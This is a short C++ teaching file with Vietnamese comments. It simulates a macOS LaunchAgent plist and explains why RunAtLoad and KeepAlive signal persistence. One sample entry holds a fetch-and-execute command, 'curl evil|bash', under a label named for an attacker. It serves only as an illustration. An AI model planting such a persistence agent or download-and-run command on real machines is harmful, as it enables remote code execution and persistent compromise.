// 07_plist_parser.cpp — Phân tích plist (LaunchAgent) đơn giản
// Mục tiêu: hiểu cấu trúc plist của LaunchAgent/LaunchDaemon (persistence macOS).
// An toàn: thuần tính toán — parse chuỗi key=value demo, không đọc plist thật.
// Biên dịch: g++ -std=c++17 -O2 plist_parser.cpp -o demo
#include <iostream>
#include <string>
#include <vector>

struct KV { std::string key, value; };

int main() {
    // Mô phỏng nội dung một LaunchAgent plist.
    std::vector<KV> plist = {
        {"Label", "com.attacker.agent"},
        {"ProgramArguments", "/bin/sh -c 'curl evil|bash'"},
        {"RunAtLoad", "true"},
        {"KeepAlive", "true"},
    };
    std::cout << "LAUNCHAGENT PLIST\n" << std::string(56,'=') << "\n\n";
    for (auto& kv : plist) std::cout << "  " << kv.key << " = " << kv.value << "\n";

    std::cout << "\nDấu hiệu persistence:\n";
    std::cout << "  - RunAtLoad=true: chạy ngay khi đăng nhập.\n";
    std::cout << "  - KeepAlive=true: tự khởi động lại khi bị kill.\n";
    return 0;
}
